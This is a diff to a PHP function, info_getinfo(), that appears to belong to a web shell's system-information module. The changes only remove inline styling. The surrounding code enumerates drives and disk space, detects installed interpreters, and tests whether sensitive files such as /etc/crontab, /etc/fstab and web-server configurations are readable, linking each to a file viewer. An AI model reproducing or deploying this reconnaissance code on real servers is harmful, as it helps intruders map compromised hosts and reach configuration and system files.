@@ -15,13 +15,13 @@ if(!function_exists('info_getinfo')){
 			foreach (range("A", "Z") as $letter){
 				if(is_readable($letter.":\\")){
 					$drive = $letter.":";
-					$res .= "<tr><td style='text-align:left;'>drive ".$drive."</td><td>".format_bit(@disk_free_space($drive))." free of ".format_bit(@disk_total_space($drive))."</td></tr>";
+					$res .= "<tr><td>drive ".$drive."</td><td>".format_bit(@disk_free_space($drive))." free of ".format_bit(@disk_total_space($drive))."</td></tr>";
 				}
 			}
 		}
-		else $res .= "<tr><td style='text-align:left;'>root partition</td><td>".format_bit(@disk_free_space("/"))." free of ".format_bit(@disk_total_space("/"))."</td></tr>";
+		else $res .= "<tr><td>root partition</td><td>".format_bit(@disk_free_space("/"))." free of ".format_bit(@disk_total_space("/"))."</td></tr>";
 
-		$res .= "<tr><td style='text-align:left;'>php</td><td>".phpversion()."</td></tr>";
+		$res .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
 		$access = array("python"=>"python -V",
 						"perl"=>"perl -e \"print \$]\"",
 						"python"=>"python -V",
@@ -39,7 +39,7 @@ if(!function_exists('info_getinfo')){
 			if($version[0]) $version = $version[0];
 			else $version = "?";
 
-			$res .= "<tr><td style='text-align:left;'>".$k."</td><td>".$version."</td></tr>";
+			$res .= "<tr><td>".$k."</td><td>".$version."</td></tr>";
 		}
 
 		if(!is_win()){
@@ -52,7 +52,7 @@ if(!function_exists('info_getinfo')){
 			"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
 			"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
 			foreach($interesting as $f){
-				if(@is_file($f) && @is_readable($f)) $res .= "<tr><td style='text-align:left;'>".$f."</td><td><a data-path='".html_safe($f)."' onclick='view_entry(this);'>".$f." is readable</a></td></tr>";
+				if(@is_file($f) && @is_readable($f)) $res .= "<tr><td>".$f."</td><td><a data-path='".html_safe($f)."' onclick='view_entry(this);'>".$f." is readable</a></td></tr>";
 			}
 		}
 		$res .= "</table></div>";
@@ -72,7 +72,7 @@ if(!function_exists('info_getinfo')){
 							$i = trim($i);
 							if($i!=""){
 								$ii = explode(":",$i);
-								if(count($ii)==2) $res .= "<tr><td style='text-align:left;'>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
+								if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
 							}
 						}
 						$res .= "</table>";
@@ -90,7 +90,7 @@ if(!function_exists('info_getinfo')){
 					$i = trim($i);
 					if($i!=""){
 						$ii = explode(":",$i);
-						if(count($ii)==2) $res .= "<tr><td style='text-align:left;'>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
+						if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
 					}
 					else $res .= "</table><table class='dataView'>";
 				}
